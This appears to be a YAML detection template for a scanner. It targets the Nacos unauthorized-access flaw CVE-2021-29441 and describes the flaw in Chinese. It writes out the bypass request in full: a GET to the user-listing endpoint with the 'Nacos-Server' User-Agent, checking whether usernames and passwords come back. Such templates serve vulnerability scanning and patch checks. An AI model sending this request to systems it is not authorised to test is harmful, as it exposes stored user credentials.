app: Alibaba-Nacos
query: protocol:"http"
meta:
  name: Nacos未授权访问漏洞-CVE-2021-29441
  level: 4
  tags:
  - ultra_vires
  description: 该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为"Nacos-Server"，如果是的话则不进行任何认证。
  homepage: ""
  author: X prism
  references: https://www.cnblogs.com/thebeastofwar/p/17920565.html
  solution: 升级至最新版
  create_at: "2024-07-24 14:52:14"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: GET
          path: /nacos/v1/auth/users?search=accurate&pageNo=1&pageSize=10
          redirect: true
          header:
          - User-Agent: Nacos-Server
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: '"username"'
          type: contains
        - name: body
          value: '"pageItems"'
          type: contains
        - name: body
          value: '"password"'
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
